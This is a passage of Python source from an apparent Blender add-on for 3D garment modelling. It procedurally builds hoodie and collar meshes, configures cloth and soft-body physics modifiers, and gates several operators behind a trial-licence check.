            join_vertices([0,1], new=True)
            join_vertices([1,2], new=True)
            join_vertices([1,5], new=True)
            join_vertices([2,6], new=True)
            join_vertices([5,6], new=True)
            
            
            
            #8&9
            bpy.context.view_layer.objects.active = top
            L1 = select_vertices([2], get_location=True, deselect=True)
            L2 = select_vertices([1], get_location=True, deselect=True)
            Placement8 = mathutils.Vector((L1[0], L1[1], L1[2]))
            Placement9 = mathutils.Vector((L2[0], L2[1], L2[2]))
            bpy.context.view_layer.objects.active = hoodie
            asv(Placement8, "Hoodie")
            asv(Placement9, "Hoodie")
            join_vertices([7,1], new=True)
            join_vertices([7,0], new=True)
            join_vertices([8,0], new=True)
            join_vertices([8,7], new=True)
            select_vertices([0,7,8], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([0,1,7], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            #10,11
            asv(Placement10, "Hoodie")
            asv(Placement11, "Hoodie")
            asv(Placement12, "Hoodie")
            asv(Placement13, "Hoodie")
            asv(Placement14, "Hoodie")
            asv(Placement15, "Hoodie")
            asv(Placement16, "Hoodie")
            asv(Placement17, "Hoodie")
            join_vertices([4,9], new=True)
            join_vertices([9,10], new=True)
            join_vertices([4,11], new=True)
            join_vertices([11,12], new=True)
            join_vertices([12,13], new=True)
            join_vertices([13,14], new=True)
            join_vertices([14,15], new=True)
            join_vertices([15,16], new=True)
            
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=5), get_vertex_global_coordinates(vertex_index=16), axis='X')
            select_vertices([16], deselect=True)
            bpy.ops.mesh.duplicate_move()
            move((D*0.6, -length*0.3, 0))
            join_vertices([16,17], new=True)
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=5), get_vertex_global_coordinates(vertex_index=17), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=5), get_vertex_global_coordinates(vertex_index=17), axis='Z')
            select_vertices([17], deselect=True)
            bpy.ops.mesh.duplicate_move()
            move((D*0.65, -edge_length(5,17)/2.25, D2/6))
            join_vertices([17,18], new=True)
            join_vertices([5,18], new=True)
            
            asv(BBN, "Hoodie")
            join_vertices([19,16], new=True)
            asv(BBN6, "Hoodie")
            asv(BBN5, "Hoodie")
            asv(BBN4, "Hoodie")
            asv(BBN3, "Hoodie")
            select_vertices([16,17,19,20], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([20,17,18,21], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([5,18,22,21], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([1,5,23,22], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([1,7], deselect=True)
            bpy.ops.mesh.delete(type='EDGE')
            select_vertices([0,1,7,23], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=15), get_vertex_global_coordinates(vertex_index=17), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=15), get_vertex_global_coordinates(vertex_index=17), axis='Y')
            select_vertices([15], deselect=True)
            bpy.ops.mesh.duplicate_move()
            move((D*1.3, -D2/2.5, 0))
            
            select_vertices([15,16,17,24], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=18), get_vertex_global_coordinates(vertex_index=24), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=18), get_vertex_global_coordinates(vertex_index=24), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=6), get_vertex_global_coordinates(vertex_index=24), axis='Z')
            select_vertices([24], deselect=True)
            bpy.ops.mesh.duplicate_move()
            move((D*3, -D2*0.7, D3*1.1))
            select_vertices([17,18,24,25], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([5,6,18,25], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=2), get_vertex_global_coordinates(vertex_index=10), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=8), get_vertex_global_coordinates(vertex_index=10), axis='z')
            select_vertices([10], deselect=True)
            bpy.ops.mesh.duplicate_move()
            move((D*0.28,0,-D*0.05))
            bpy.ops.mesh.duplicate_move()
            move((D*0.22,0,-D*0.24))
            bpy.ops.mesh.duplicate_move()
            move((D*0.15,0,-D*0.52))
            join_vertices([10,26], new=True)
            join_vertices([26,27], new=True)
            join_vertices([27,28], new=True)
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=3), get_vertex_global_coordinates(vertex_index=28), axis='Y')
            select_vertices([28,27], deselect=True)
            move((0,D*0.5,0))
            select_vertices([26], deselect=True)
            move((0,D*0.3,0))
            select_vertices([28], deselect=True)
            move((0,D*0.3,0))
            join_vertices([3,28], new=True)
            
            D = edge_length(15,24)
            select_vertices([14], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D*0.8, -D*0.1, -D*0.2))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=24), get_vertex_global_coordinates(vertex_index=25), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=24), get_vertex_global_coordinates(vertex_index=25), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=24), get_vertex_global_coordinates(vertex_index=25), axis='Z')
            select_vertices([29], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D, -D2, D3*0.6))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=6), get_vertex_global_coordinates(vertex_index=25), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=6), get_vertex_global_coordinates(vertex_index=25), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=6), get_vertex_global_coordinates(vertex_index=25), axis='Z')
            select_vertices([30], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D, -D2, -D3))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=28), get_vertex_global_coordinates(vertex_index=31), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=28), get_vertex_global_coordinates(vertex_index=31), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=28), get_vertex_global_coordinates(vertex_index=31), axis='Z')
            select_vertices([31], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D*0.2, -D2*0.5, -D3*0.5))
            
            join_vertices([28,32], new=True)
            
            select_vertices([2,3,28,32], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([2,6,31,32], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([6,25,30,31], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([24,25,29,30], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([14,15,24,29], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=14), get_vertex_global_coordinates(vertex_index=29), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=14), get_vertex_global_coordinates(vertex_index=29), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=14), get_vertex_global_coordinates(vertex_index=29), axis='Z')
            select_vertices([13], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D*0.8, -D2*2, -D3*0.25))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=29), get_vertex_global_coordinates(vertex_index=30), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=29), get_vertex_global_coordinates(vertex_index=30), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=29), get_vertex_global_coordinates(vertex_index=30), axis='Z')
            select_vertices([33], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D, -D2*0.8, D3))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=30), get_vertex_global_coordinates(vertex_index=31), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=30), get_vertex_global_coordinates(vertex_index=31), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=33), get_vertex_global_coordinates(vertex_index=34), axis='Z')
            select_vertices([34], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D, -D2*0.8, -D3))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=31), get_vertex_global_coordinates(vertex_index=32), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=31), get_vertex_global_coordinates(vertex_index=32), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=31), get_vertex_global_coordinates(vertex_index=32), axis='Z')
            select_vertices([35], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D, -D2, -D3*0.5))
            
            select_vertices([27,28,32,36], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([31,32,35,36], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([30,31,34,35], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([29,30,33,34], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([13,14,29,33], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=13), get_vertex_global_coordinates(vertex_index=33), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=13), get_vertex_global_coordinates(vertex_index=33), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=13), get_vertex_global_coordinates(vertex_index=33), axis='Z')
            select_vertices([12], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D*0.5, -D2*0.25, -D3*2))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=12), get_vertex_global_coordinates(vertex_index=37), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=11), get_vertex_global_coordinates(vertex_index=12), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=11), get_vertex_global_coordinates(vertex_index=12), axis='Z')
            select_vertices([37], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D*0.8, -D2, D3*0.5))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=37), get_vertex_global_coordinates(vertex_index=38), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=4), get_vertex_global_coordinates(vertex_index=11), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=37), get_vertex_global_coordinates(vertex_index=38), axis='Z')
            select_vertices([38], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((D*0.5, -D2*0.9, -D3*0.5))
            
            D = axis_distance(get_vertex_global_coordinates(vertex_index=38), get_vertex_global_coordinates(vertex_index=39), axis='X')
            D2 = axis_distance(get_vertex_global_coordinates(vertex_index=26), get_vertex_global_coordinates(vertex_index=39), axis='Y')
            D3 = axis_distance(get_vertex_global_coordinates(vertex_index=26), get_vertex_global_coordinates(vertex_index=39), axis='Z')
            select_vertices([39], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((-D, -D2*0.5, -D3*0.5))
            
            select_vertices([26,27,36,40], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([35,36,39,40], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([34,35,38,39], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([33,34,37,38], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([12,13,33,37], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([9,10,26,40], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([4,9,39,40], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([4,11,38,39], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([11,12,37,38], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            select_vertices([7,8,19,20,21,22,23], deselect=True)
            group_vertices(name_of_group="HoodieNeckLoop", weight=1)
            group_vertices(name_of_group="Pinning", weight=1)
            group_vertices(name_of_group="Shrinkwrap", weight=1)
            group_vertices(name_of_group="Hoodie", weight=1)
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.select_all(action='SELECT')
            deselect_vertex_group(group_name="Hoodie")
            group_vertices(name_of_group="Hoodie", weight=0.1)
            
            select_vertices([4,9,10,11,12,13,14,15,16,19], deselect=True)
            bpy.ops.mesh.mark_sharp()
            
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.normals_make_consistent(inside=False)
            
            
            #Hide NeckVertsForSculpting
            #select_vertices([7,8,19,20,21,22,23], deselect=True)
            #bpy.ops.mesh.hide(unselected=False)
            
            
            
            #Softbody Setup
            bpy.ops.object.mode_set(mode = 'OBJECT')
            bpy.ops.object.shade_smooth()
            bpy.ops.object.modifier_add(type='MIRROR')
            bpy.ops.object.modifier_apply(modifier="Mirror", report=True)
            bpy.ops.object.modifier_add(type='CLOTH')
            
            #bpy.ops.object.modifier_add(type='SOFT_BODY')
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.ops.object.modifier_move_to_index(modifier="SurfaceDeform", index=0)
            bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.character_object
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.ops.object.modifier_move_to_index(modifier="Shrinkwrap", index=0)
            bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Shrinkwrap"
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision"].render_levels = 1
            bpy.ops.object.modifier_move_to_index(modifier="Subdivision", index=0)
            
            bpy.context.object.modifiers["Cloth"].settings.quality = 10
            bpy.context.object.modifiers["Cloth"].collision_settings.collision_quality = 5
            bpy.context.object.modifiers["Cloth"].settings.vertex_group_mass = "Pinning"
            bpy.context.object.modifiers["Cloth"].collision_settings.distance_min = 0.001
            bpy.context.object.modifiers["Cloth"].collision_settings.use_self_collision = True
            bpy.context.object.modifiers["Cloth"].collision_settings.self_distance_min = 0.001
            bpy.context.object.modifiers["Cloth"].collision_settings.self_friction = 1
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.compression_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.bending_stiffness = 3
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.3
            bpy.context.object.modifiers["Cloth"].settings.tension_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.compression_damping = 10
            bpy.context.object.modifiers["Cloth"].settings.shear_damping = 10
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.context.object.modifiers["SurfaceDeform.001"].target = bpy.context.scene.cloth_object
            bpy.context.object.modifiers["SurfaceDeform.001"].vertex_group = "HoodieNeckLoop"
            
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            
            bpy.context.object.modifiers["Shrinkwrap.001"].vertex_group = "Shrinkwrap"
            bpy.context.object.modifiers["Shrinkwrap.001"].target = bpy.context.scene.cloth_object
            bpy.ops.object.modifier_add(type='SUBSURF')
            bpy.context.object.modifiers["Subdivision.001"].render_levels = 1
            bpy.ops.object.modifier_add(type='EDGE_SPLIT')
            bpy.context.object.modifiers["EdgeSplit"].use_edge_angle = False
            bpy.ops.object.modifier_add(type='SOLIDIFY')
            bpy.context.object.modifiers["Solidify"].thickness = solidifymass
            bpy.context.object.modifiers["Solidify"].offset = solidifyoffset
            bpy.ops.preferences.addon_enable(module="space_view3d_modifier_tools")
            bpy.ops.wm.toggle_all_show_expanded()
            bpy.ops.view3d.view_selected(use_all_regions=False)
            bpy.ops.object.mode_set(mode = 'SCULPT')
            bpy.context.object.use_mesh_mirror_x = True
            bpy.ops.wm.tool_set_by_id(name="builtin_brush.Grab")
            
            
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Divine Hoodie")
            bpy.ops.object.play_sound(sound_name="Bind.mp3")
            return{'FINISHED'}
    
class OBJECT_OT_add_collar(bpy.types.Operator):
    bl_idname = "object.add_collar"
    bl_label = "Add Collar"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            source = bpy.context.active_object
            safename = source.name
            bpy.context.active_object.name = 'gonnabemakingacollar'
            bpy.ops.object.mode_set(mode = 'EDIT')
            select_vertices([0,1,2,3,4,5,6], deselect=True)
            bpy.ops.mesh.duplicate_move()
            bpy.ops.mesh.separate(type='SELECTED')
            bpy.ops.object.mode_set(mode = 'OBJECT')
            source.name = safename
            Collar = bpy.data.objects["gonnabemakingacollar.001"]
            bpy.ops.object.select_all(action='DESELECT')
            bpy.context.view_layer.objects.active = Collar
            Collar.name = 'Divine_Collar'
            bpy.ops.object.mode_set(mode = 'EDIT')
            length = edge_length(1,2)
            bottomplacement = select_vertices([0,1], deselect=True, get_location=True)
            select_vertices([0,1,2,3,4,5,6], deselect=True)
            Row0 = [0,1,2,3,4,5,6]
            bpy.ops.mesh.extrude_region_move()
            move((0,0,length))
            Row1 = [7,8,9,10,11,12,13]
            topplacement = select_vertices([7,8], deselect=True, get_location=True)
            select_vertices(Row1, deselect=True)
            bpy.ops.mesh.extrude_region_move()
            move((0,0,-length))
            Row2 = [14,15,16,17,18,19,20]
            select_vertices(Row2, deselect=True)
            scale_vertices_around_location(bottomplacement, 1.2)
            select_vertices([8,15], deselect=True)
            move((length/2, 0, 0))
            select_vertices([8,15,16], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            select_vertices(Row1, deselect=True)
            bpy.ops.transform.edge_crease(value=0.85, snap=False)

            #Weights
            bpy.ops.mesh.select_all(action='SELECT')
            group_vertices(name_of_group="Collar", weight=1)
            select_vertices(Row1+Row2, deselect=True)
            replace_weights(group='Collar', weight=0.5)
            bpy.ops.mesh.select_all(action='SELECT')
            replace_weights(group='Shrinkwrap', weight=0)
            select_vertices(Row0, deselect=True)
            replace_weights(group='Shrinkwrap', weight=1)
            
            

            #Softbody Setup
            bpy.ops.object.mode_set(mode = 'OBJECT')
            bpy.data.objects[Collar.name].select_set(True)
            bpy.context.view_layer.objects.active = Collar
            bpy.ops.object.shade_smooth()
            bpy.ops.object.modifier_apply(modifier="Mirror", report=True)
            bpy.ops.object.modifier_remove(modifier="Cloth")
            bpy.ops.object.modifier_remove(modifier="SurfaceDeform")
            bpy.ops.object.modifier_add(type='SOFT_BODY')
            bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.ops.object.modifier_move_to_index(modifier="SurfaceDeform", index=0)
            bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
            bpy.ops.object.modifier_remove(modifier="Shrinkwrap")
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.ops.object.modifier_move_to_index(modifier="Shrinkwrap", index=0)
            bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Shrinkwrap"
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
            bpy.context.object.modifiers["Softbody"].settings.mass = 0.5
            bpy.context.object.modifiers["Softbody"].settings.vertex_group_goal = "Collar"
            bpy.context.object.modifiers["Softbody"].settings.goal_spring = 0.7
            bpy.context.object.modifiers["Softbody"].settings.goal_friction = 25
            bpy.context.object.modifiers["Softbody"].settings.goal_default = 1
            bpy.context.object.modifiers["Softbody"].settings.goal_min = 0.5
            bpy.context.object.modifiers["Softbody"].settings.goal_max = 1
            bpy.context.object.modifiers["Softbody"].settings.use_stiff_quads = True
            bpy.context.object.modifiers["Softbody"].settings.step_min = 10
            bpy.context.object.modifiers["Softbody"].settings.vertex_group_mass = "Collar"
            bpy.context.object.modifiers["Softbody"].settings.use_face_collision = True
            bpy.context.object.modifiers["Softbody"].settings.shear = 0.5
            bpy.context.object.modifiers["Softbody"].settings.bend = 5
            bpy.ops.object.modifier_remove(modifier="Smooth")
            if(get_modifier_index("Shrinkwrap.001") is not None):
                bpy.ops.object.modifier_remove(modifier="Shrinkwrap.001")
            bpy.ops.object.modifier_add(type='SHRINKWRAP')
            bpy.ops.object.modifier_move_to_index(modifier="Shrinkwrap.001", index=5)
            bpy.context.object.modifiers["Shrinkwrap.001"].vertex_group = "Shrinkwrap"
            bpy.context.object.modifiers["Shrinkwrap.001"].target = bpy.context.scene.cloth_object
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Divine Collar")
            bpy.ops.object.play_sound(sound_name="RegisterDivine.mp3")


            
            return{'FINISHED'}

class OBJECT_OT_bloat(bpy.types.Operator):
    bl_idname = "object.bloat"
    bl_label = "Bloat"
    
    
    def execute(self, context):
        return {'FINISHED'}
    

class OBJECT_OT_enable_collar(bpy.types.Operator):
    bl_idname = "object.enable_collar"
    bl_label = "Enable Collar"
    bl_description = "Toggles Collar Simulation"
    
    
    def execute(self, context):
        if(bpy.context.object.modifiers["Softbody"].show_viewport == True):
            bpy.context.object.modifiers["Softbody"].show_viewport = False
            bpy.context.object.modifiers["Softbody"].show_render = False

        else:
            bpy.context.object.modifiers["Softbody"].show_viewport = True
            bpy.context.object.modifiers["Softbody"].show_render = True

        return {'FINISHED'}    


class OBJECT_OT_play_sound(bpy.types.Operator):
    bl_idname = "object.play_sound"
    bl_label = "PlaySound"
    
    sound_name: bpy.props.StringProperty()
    
    def execute(self, context):
        global sound
        sound = bpy.context.preferences.addons["DivineCut"].preferences.sewingsound
        if sound:
            device = aud.Device()
            input_string = bpy.context.preferences.addons["DivineCut"].preferences.sewing_sound_path
            target_substring = "DivineCut Free Trial\\"
            index = input_string.find(target_substring)
            soundpath = "path"
            if index != -1:
                soundpath = input_string[:index + len(target_substring)]
            else:
                soundpath = input_string
            #sound = aud.Sound(bpy.context.preferences.addons["DivineCut"].preferences.sewing_sound_path + "GNRZHLKN07/" +  self.sound_name)
            sound = aud.Sound(soundpath + "GNRZHLKN07/" +  self.sound_name)
            handle = device.play(sound)
            #sound_buffered = aud.Sound.cache(sound)
            #handle_buffered = device.play(sound_buffered)
        return {'FINISHED'}

class OBJECT_OT_turn_to_puffer_jacket(bpy.types.Operator):
    bl_idname = "object.turn_to_puffer_jacket"
    bl_label = "Turn to Puffer Jacket"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            bpy.ops.object.play_sound(sound_name="NewPreset.mp3")
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'LOCAL'
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            #Cuff Wrists
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertex_group("Unwrap", deselect=True)
            bpy.ops.mesh.mark_sharp()
            select_vertex_group("BiceptLoop", deselect=True)
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            replace_weights(group='Pinning', weight=1)
            deselect_vertex_group(group_name="BiceptLoop")
            bpy.ops.mesh.mark_sharp()
            
            #Sort out Back
            select_vertices([0], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            #bpy.ops.object.vertex_group_smooth(group_select_mode='ALL', repeat=3)
            
            #Sort Front/Chest
            select_vertices([1], deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            replace_weights(group='Shrinkwrap', weight=1)
            replace_weights(group='Smooth', weight=1)
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Shrinkwrap'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Smooth'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            #bpy.ops.object.vertex_group_smooth(group_select_mode='ALL', repeat=3)
            
            if(bpy.context.scene.preset_open_toggle_property):
                #Rip Open
                proportional_size = edge_length(19,21)*0.8
                movement_size = edge_length(19,47)
                select_vertices([1,19], deselect=True)
                bpy.ops.mesh.shortest_path_select()
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
                bpy.context.scene.tool_settings.use_proportional_edit = True
                bpy.context.scene.tool_settings.use_proportional_connected = True
                bpy.context.scene.tool_settings.proportional_distance = proportional_size
                bpy.ops.transform.translate(value=(movement_size, 0, 0), orient_type='GLOBAL', orient_matrix=((1, 0, 0), (0, 1, 0), (0, 0, 1)), orient_matrix_type='LOCAL', constraint_axis=(True, False, False), mirror=True, use_proportional_edit=True, proportional_edit_falloff='SMOOTH', proportional_size=proportional_size, use_proportional_connected=True, use_proportional_projected=False, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False)
                bpy.context.scene.tool_settings.use_proportional_edit = False
            else:
                select_vertices([1,19], deselect=True)
                bpy.ops.mesh.shortest_path_select()
                bpy.ops.transform.edge_crease(value=1, snap=False)
                bpy.ops.mesh.mark_sharp()
                
            if(bpy.context.scene.preset_hoodie_toggle_property):
                #Add Hoodie
                bpy.ops.object.add_hoodie()
                bpy.ops.object.mode_set(mode='OBJECT')
                hoodie = bpy.context.active_object
                bpy.context.object.modifiers["Cloth"].settings.mass = 1
                bpy.ops.object.select_all(action='DESELECT')
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            
            
            #Cloth Physics Settings
            bpy.context.object.modifiers["Cloth"].settings.quality = 15
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.075
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 2
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 2
            bpy.ops.object.modifier_add(type='COLLISION')
            bpy.context.object.collision.damping = 0.5
            bpy.context.object.collision.thickness_outer = 0.001
            bpy.context.object.collision.thickness_inner = 0.001
            bpy.context.object.collision.cloth_friction = 1
            bpy.ops.object.modifier_move_to_index(modifier="Collision", index=(get_modifier_index("Cloth") + 1))
            
            #Sorting out Sharpness
            bpy.ops.object.mode_set(mode='EDIT')
            select_vertices([47,19,2,1], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            bpy.ops.mesh.mark_sharp()
            
            #Pinning Collar
            select_vertices([4], deselect=True)
            replace_weights(group="Pinning", weight=1)
            replace_weights(group="Shrinkwrap", weight=1)
            
            #Pinning Chest
            select_vertices([1,2,3,4,36,63], deselect=True)
            bpy.ops.mesh.select_more()
            replace_weights(group="Pinning", weight=0.8)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['Pinning'].index
            bpy.ops.object.vertex_group_smooth(group_select_mode='ACTIVE', repeat=3)
            
            
            #Sleeve  Puffer
            bpy.ops.mesh.select_all(action='DESELECT')
            bpy.ops.mesh.select_linked_pick(deselect=False, delimit={'UV'}, object_index=0, index=30)
            bpy.ops.mesh.hide(unselected=True)
            bpy.ops.mesh.select_all(action='DESELECT')
            select_vertex_group("Bicept", deselect=True)
            bpy.ops.mesh.select_more()
            sleeve = append_selected_vertices_indices_to_array()
            bpy.ops.mesh.select_all(action='DESELECT')
            select_vertices(sleeve, deselect=True)
            basket = []
            puffselection = []
            select_vertex_group("BiceptLoop", deselect=True)
            basket += append_selected_vertices_indices_to_array()
            bpy.ops.mesh.select_more()
            deselect_vertex_group(group_name="BiceptLoop")
            #puffselection += append_selected_vertices_indices_to_array()
            select_vertices(puffselection, deselect=True)
            
            
            select_vertices(basket, deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            #basket = append_selected_vertices_indices_to_array()
            group_vertices(name_of_group="DivineCursorA", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_more()
            basket = append_selected_vertices_indices_to_array()
            bpy.context.active_object.vertex_groups.active_index = bpy.context.active_object.vertex_groups['DivineCursorA'].index
            bpy.ops.object.vertex_group_deselect()
            bpy.ops.object.vertex_group_remove(all=False, all_unlocked=False)
            puffselection += append_selected_vertices_indices_to_array()
            
            select_vertices(puffselection, deselect=True)
            
            select_vertices(basket, deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
            bpy.ops.mesh.select_more()
